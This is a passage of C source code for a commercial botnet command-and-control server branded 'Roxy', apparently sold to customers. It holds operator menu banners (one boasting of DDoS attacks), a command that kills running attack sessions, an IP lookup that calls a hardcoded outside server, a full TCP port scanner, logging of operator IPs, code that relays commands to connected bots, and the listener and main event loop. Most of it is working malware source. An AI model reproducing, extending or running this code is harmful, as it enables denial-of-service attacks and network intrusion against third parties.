                sprintf(envoyw6, "\x1b[1;90m\x1b[1;95        █   ██    █▐                 \r\n");
                sprintf(envoyw7, "\x1b[1;90m\x1b[1;95                  ▐                  \r\n");
				
				if(send(datafd, envoyw1, strlen(envoyw1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyw2, strlen(envoyw2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyw3, strlen(envoyw3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyw4, strlen(envoyw4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyw5, strlen(envoyw5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyw6, strlen(envoyw6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyw7, strlen(envoyw7), MSG_NOSIGNAL) == -1) goto end;
                while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;95m╔═\x1b[1;95m[\x1b[1;95m%s\x1b[1;95m🤡\x1b[1;95mRoxy🤡\x1b[1;95m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;95m╚═══════>\x1b[1;96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "link") || strstr(buf, "Link") || strstr(buf, "LINK")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char apiinput1  [800];			
				sprintf(apiinput1, "\x1b[1;90m""\r\n");
				if(send(datafd, apiinput1, strlen(apiinput1), MSG_NOSIGNAL) == -1) goto end;
                while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
				if(strstr(buf, "enviyhggoyv3")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char envoyr1  [800];
				char envoyr2  [800];
				char envoyr3  [800];
				char envoyr4  [800];
				char envoyr5  [800];
				char envoyr6  [800];
                char envoyr7  [800];
                char envoyr8  [800];
                char envoyr9  [800];
                char envoyr10  [800];
                char envoyr11  [800];
                char envoyr12  [800];
                char envoyr13  [800];
                char envoyr14  [800];
                char envoyr15  [800];
                char envoyr16  [800];
				char envoyr17  [800];

				sprintf(envoyr1, "\x1b[38;5;92m   ╔═════════════════╦════════════════════╦═════════════════╗\r\n");
                sprintf(envoyr2, "\x1b[38;5;92m   ║   Version [1.6] ║[Welcome To Envoy]  ║  Version [1.6]  ║\r\n");
                sprintf(envoyr3, "\x1b[38;5;92m   ╠═════════════════╩════════════════════╩═════════════════╣ \r\n");
                sprintf(envoyr4, "\x1b[38;5;92m   ║                    \x1b[1;31m┌─┐┌┐┌┬  ┬┌─┐┬ ┬             \x1b[38;5;92m       ║ \r\n");
                sprintf(envoyr5, "\x1b[38;5;92m   ║                    \x1b[1;31m├┤ │││└┐┌┘│ │└┬┘             \x1b[38;5;92m       ║   \r\n");
                sprintf(envoyr6, "\x1b[38;5;92m   ║                    \x1b[1;31m└─┘┘└┘ └┘ └─┘ ┴              \x1b[38;5;92m       ║  \r\n");
                sprintf(envoyr7, "\x1b[38;5;92m   ║               ╔═════════════════════╗                  ║ \r\n");
                sprintf(envoyr8, "\x1b[38;5;92m   ╠═══════════════╣ [Commands To Help]  ╠══════════════════╣ \r\n");
                sprintf(envoyr9, "\x1b[38;5;92m   ║               ╚═════════════════════╝                  ║ \r\n");
               sprintf(envoyr10, "\x1b[38;5;92m   ╠══════════╦═════════════════════════════════════════════╣ \r\n");
               sprintf(envoyr11, "\x1b[38;5;92m   ║\x1b[1;31m[LOGOUT] \x1b[38;5;92m ║\x1b[1;31m-  [Logs You Out]    \x1b[38;5;92m                        ║ \r\n");
               sprintf(envoyr12, "\x1b[38;5;92m   ║\x1b[1;31m[HELP]   \x1b[38;5;92m ║ \x1b[1;31m- [Shows You The Commands]               \x1b[38;5;92m   ║\r\n");
               sprintf(envoyr13, "\x1b[38;5;92m   ║\x1b[1;31m[CLEAR]  \x1b[38;5;92m ║ \x1b[1;31m- [Clears The Screen]                    \x1b[38;5;92m   ║ \r\n");
               sprintf(envoyr14, "\x1b[38;5;92m   ║\x1b[1;31m[Ports]  \x1b[38;5;92m ║ \x1b[1;31m- [Shows Attack Ports Best 1839]          \x1b[38;5;92m  ║ \r\n");
               sprintf(envoyr15, "\x1b[38;5;92m   ║\x1b[1;31m[Tools]  \x1b[38;5;92m ║ \x1b[1;31m- [Shows The Tools]                    \x1b[38;5;92m     ║ \r\n");
               sprintf(envoyr16, "\x1b[38;5;92m   ║\x1b[1;31m[extra]  \x1b[38;5;92m ║ \x1b[1;31m- [Shows shit You Can Use]             \x1b[38;5;92m     ║ \r\n");
			   sprintf(envoyr17, "\x1b[38;5;92m   ╚══════════╩═════════════════════════════════════════════╝  \r\n");

				if(send(datafd, envoyr1, strlen(envoyr1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyr2, strlen(envoyr2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyr3, strlen(envoyr3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyr4, strlen(envoyr4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyr5, strlen(envoyr5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoyr6, strlen(envoyr6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr7, strlen(envoyr7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr8, strlen(envoyr8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr9, strlen(envoyr9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr10, strlen(envoyr10), MSG_NOSIGNAL) == -1) goto end; 
                if(send(datafd, envoyr11, strlen(envoyr11), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr12, strlen(envoyr12), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr13, strlen(envoyr13), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr14, strlen(envoyr14), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr15, strlen(envoyr15), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr16, strlen(envoyr16), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoyr17, strlen(envoyr17), MSG_NOSIGNAL) == -1) goto end;
                while(1) {			
			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;90m╔═\x1b[1;90m[\x1b[1;90m%s\x1b[1;95m🤡\x1b[1;95mRoxy🤡\x1b[1;90m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;90m╚═══════>\x1b[1;96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
        
			if(strstr(buf, "paraxinal") || strstr(buf, "PARAXINAL") || strstr(buf, "Paraxinal")) {
				pthread_create(&title, NULL, &TitleWriter, datafd);
		char banner1lul1 [5000];
		char banner2lul2 [5000];
		char banner3lul3 [5000];
		char banner4lul4 [5000];
		char banner5lul5 [5000];
		char banner6lul6 [5000];
		char banner7lul7 [5000];                                                              
		char banner8lul8 [5000];
		char banner9lul9 [5000];

        sprintf(banner1lul1,"\e[1;91m                                                                        \r\n");
		sprintf(banner2lul2,"\e[1;91m                   ╔═╗ ╔═╗ ╦═╗ ╔═╗ ═╗ ╦ ╦ ╔╗╔ ╔═╗ ╦                   \r\n");
		sprintf(banner3lul3,"\e[1;91m                   ╠═╝ ╠═╣ ╠╦╝ ╠═╣ ╔╩╦╝ ║ ║║║ ╠═╣ ║                   \r\n");
        sprintf(banner4lul4,"\e[1;91m                   ╩   ╩ ╩ ╩╚═ ╩ ╩ ╩ ╚═ ╩ ╝╚╝ ╩ ╩ ╩═╝                 \r\n");                
        sprintf(banner5lul5,"\e[1;91m               ╔═══════════════════════════════════════╗          \r\n");
        sprintf(banner6lul6,"\e[1;91m               ║         [\e[37m+\e[31m]\e[37mHost: Paraxinal\e[31m[\e[37m+\e[31m]         ║          \r\n"); 
        sprintf(banner7lul7,"\e[1;91m               ║         [\e[37m+\e[31m]\e[37mDDOSING FBI-CEO\e[31m[\e[37m+\e[31m]         ║          \r\n");                                                                                             
        sprintf(banner8lul8,"\e[1;91m               ║         [\e[37m+\e[31m]\e[37mType ? For Help\e[31m[\e[37m+\e[31m]         ║          \r\n");     
        sprintf(banner9lul9,"\e[1;91m               ╚═══════════════════════════════════════╝          \r\n");  

    if(send(datafd, banner1lul1, strlen(banner1lul1), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner2lul2, strlen(banner2lul2), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner3lul3, strlen(banner3lul3), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner4lul4, strlen(banner4lul4), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner5lul5, strlen(banner5lul5), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner6lul6, strlen(banner6lul6), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner7lul7, strlen(banner7lul7), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner8lul8, strlen(banner8lul8), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, banner9lul9, strlen(banner9lul9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {			
		
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
		
		  if(strstr(buf, "antisocial")) {	
		
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banmer_line0   [5000];
		char ascii_banmer_line1   [5000];
        char ascii_banmer_line2   [5000];
        char ascii_banmer_line3   [5000];
        char ascii_banmer_line4   [5000];
        char ascii_banmer_line5   [5000];
        char ascii_banmer_line6   [5000];
        char ascii_banmer_line7   [5000];
        char ascii_banmer_line8   [5000];
        char ascii_banmer_line9   [5000];
        char ascii_banmer_line10  [5000];
        char ascii_banmer_line11  [5000];

  sprintf(ascii_banmer_line0,    "\033[2J\033[1;1H");		
  sprintf(ascii_banmer_line1,     "\e[31m █████╗ ███╗   ██╗████████╗██╗███████╗\e[34m ██████╗  ██████╗██╗ █████╗ ██╗\e[31m\r\n");
  sprintf(ascii_banmer_line2,     "\e[31m██╔══██╗████╗  ██║╚══██╔══╝██║██╔════╝\e[34m██╔═══██╗██╔════╝██║██╔══██╗██║\e[31m\r\n");
  sprintf(ascii_banmer_line3,     "\e[31m███████║██╔██╗ ██║   ██║   ██║███████╗\e[34m██║   ██║██║     ██║███████║██║     \e[31m\r\n");
  sprintf(ascii_banmer_line4,     "\e[31m██╔══██║██║╚██╗██║   ██║   ██║╚════██║\e[34m██║   ██║██║     ██║██╔══██║██║     \e[31m\r\n");
  sprintf(ascii_banmer_line5,     "\e[37m██║  ██║██║ ╚████║   ██║   ██║███████║\e[34m╚██████╔╝╚██████╗██║██║  ██║███████╗\e[31m\r\n");
  sprintf(ascii_banmer_line6,     "\e[37m╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚══════╝\e[34m ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝\e[31m\r\n");
  

  if(send(datafd, ascii_banmer_line0, strlen(ascii_banmer_line0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line1, strlen(ascii_banmer_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line2, strlen(ascii_banmer_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line3, strlen(ascii_banmer_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line4, strlen(ascii_banmer_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line5, strlen(ascii_banmer_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line6, strlen(ascii_banmer_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line7, strlen(ascii_banmer_line7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line8, strlen(ascii_banmer_line8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line9, strlen(ascii_banmer_line9), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line10, strlen(ascii_banmer_line10), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banmer_line11, strlen(ascii_banmer_line11), MSG_NOSIGNAL) == -1) goto end;
       
         while(1) {			
		
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
	
	if(strstr(buf, "goofy") || strstr(buf, "Goofy") || strstr(buf, "GOOFY")) {		
    
    char banner1lol1[5000];
    char banner1lol2[5000];
    char banner1lol3[5000];
    char banner1lol4[5000];
    char banner1lol5[5000];
    char banner1lol6[5000];
    char banner1lol7[5000];
    char banner1lol8[5000];

    sprintf(banner1lol1, "\033[37m\033[2J\033[1;1H");
    sprintf(banner1lol2, "\033[32m                             ┌─┐┌─┐┌─┐┌─┐┬ ┬\r\n");
    sprintf(banner1lol3, "\033[32m                             │ ┬│ ││ │├┤ └┬┘\r\n");
    sprintf(banner1lol4, "\033[32m                             └─┘└─┘└─┘└   ┴ \r\n");
    sprintf(banner1lol5, "\033[32m \r\n");
    sprintf(banner1lol6, "\033[32m \r\n"); 
    sprintf(banner1lol7, "\033[32m \r\n"); 
    sprintf(banner1lol8, "\033[90m                   [+]\033[31m Type Help For All Commands \033[90m[+] \r\n");

    if (send(datafd, banner1lol1, strlen(banner1lol1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol2, strlen(banner1lol2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol3, strlen(banner1lol3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol4, strlen(banner1lol4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol5, strlen(banner1lol5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol6, strlen(banner1lol6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol7, strlen(banner1lol7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol8, strlen(banner1lol8), MSG_NOSIGNAL) == -1) goto end;
	
		       while(1) {			
	
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}

			    if(strstr(buf, "stop")) {
				char *token = strtok(buf, " ");
				char *attackinfo = token+sizeof(token);
				trim(attackinfo);
				char *ainfo[50];
				sprintf(ainfo, "pkill -9 tmux", attackinfo); // kills tmux proc, this stops all attacks running
				printf("User [\e[32m%s\e[97m] Attempted to stop attack on IP: %s\n ", login_infos[find_line].id, attackinfo);
				sprintf(botnet, "Stopping all attacks on \e[91m%s\r\n", attackinfo);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				while(1) {
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				system(ainfo);
				break;
				}
				continue;
}
			else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
            {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "185.212.47.56"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.pfeatures?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup token!\n");
                        sprintf(botnet, "\x1b[0m[\x1b[1;31mIPLookup\x1b[0m] \x1b[1;31mGetting Info For -> %s]\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, token can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have pfeatures installed for token to work...\x1b[0m\r\n");
                        else sprintf(botnet, "\x1b[1;31m[+]--- \x1b[0mResults\x1b[1;31m ---[+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
              }
            }		
			else if(strstr(buf, "SCAN ") || strstr(buf, "scan"))
        {
			int x;
            int ps_timeout = 2; // usually set this as 2 or 3 but 1 is faster since theres going to be customers
            int least_port = 0; // this is the least number we want to set
            int max_port = 65532; // this is the max port we want to check
            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(botnet, sizeof(botnet), "\x1b[1;31m[\x1b[0mPortscanner\x1b[1;31m] \x1b[0mChecking ports \x1b[1;31m%d-%d \x1b[0mon -> \x1b[1;31m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(botnet, sizeof(botnet), "\x1b[1;31m[\x1b[0mPortscanner\x1b[1;31m] %d \x1b[0mis open on \x1b[1;31m%s!\x1b[0m\r\n", x, host);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1b[1;31m[\x1b[0mPortscanner\x1b[1;31m] \x1b[32mScan on \x1b[1;31m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			if(strstr(buf, "logout") || strstr(buf, "LOGOUT") || strstr(buf, "Logout")) {
			pthread_create(&title, NULL, &TitleWriter, sock);
			char logoutmessage1 [2048];

			sprintf(logoutmessage1, "\e[1;96mThanks For Buying Roxy方 Go Check Out Are VPNS \r\n");

			if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;
			sleep(5);
			goto end;
			}

            trim(buf);
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",login_infos[find_line].id, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: | %s %s\n", formatted_gmt, login_infos[find_line].id, buf, login_infos[datafd].ip); // this would be your ip log, right?  i think so yh, well then why do you need one?, dont you alreaady have one or am i trippin, do you want their ip, is that what tyou need?< 
            fclose(LogFile);
            broadcast(buf, datafd, login_infos[find_line].id);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}

//Bot Listener, Uses Socket----------------------------------------------------------------------------------
void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding"); // there 
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                strcpy(login_infos[newsockfd].ip, inet_ntoa(cli_addr.sin_addr));
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
//-------------------------------------------------

int main (int argc, char *argv[], void *sock) { // there
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[1;31mBlazing On That 420 Ash\x1b[0m\n");
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
          }